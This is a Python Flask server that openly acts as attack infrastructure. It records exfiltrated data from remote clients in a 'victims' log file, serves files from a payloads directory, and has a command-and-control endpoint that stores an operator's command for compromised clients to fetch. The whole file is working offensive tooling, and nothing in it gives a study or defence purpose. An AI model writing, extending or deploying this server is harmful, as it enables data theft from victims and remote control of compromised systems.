from flask import Flask, request, render_template, send_from_directory, jsonify
import os
import datetime

app = Flask(__name__)
LOG_FILE = "logs/victims.txt"

# Ensure log directory exists
os.makedirs("logs", exist_ok=True)

@app.route('/')
def dashboard():
    return render_template('dashboard.html')

@app.route('/static/<path:filename>')
def serve_static(filename):
    return send_from_directory('static', filename)

@app.route('/payloads/<path:filename>')
def serve_payloads(filename):
    return send_from_directory('payloads', filename)

@app.route('/log', methods=['GET', 'POST'])
def log_data():
    try:
        timestamp = datetime.datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
        if request.method == 'POST':
            data = request.get_json() or {}
            message = str(data)
        else:
            message = request.query_string.decode()
        with open(LOG_FILE, 'a') as f:
            f.write(f"{timestamp} {message}\n")
        return '', 204
    except Exception as e:
        return f"Error: {str(e)}", 500

@app.route('/cmd', methods=['GET', 'POST'])
def command_control():
    if request.method == 'POST':
        with open("cmd.txt", "w") as f:
            f.write(request.data.decode())
        return "Command received", 200
    elif request.method == 'GET':
        if os.path.exists("cmd.txt"):
            with open("cmd.txt", "r") as f:
                return f.read(), 200
        return '', 204

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)
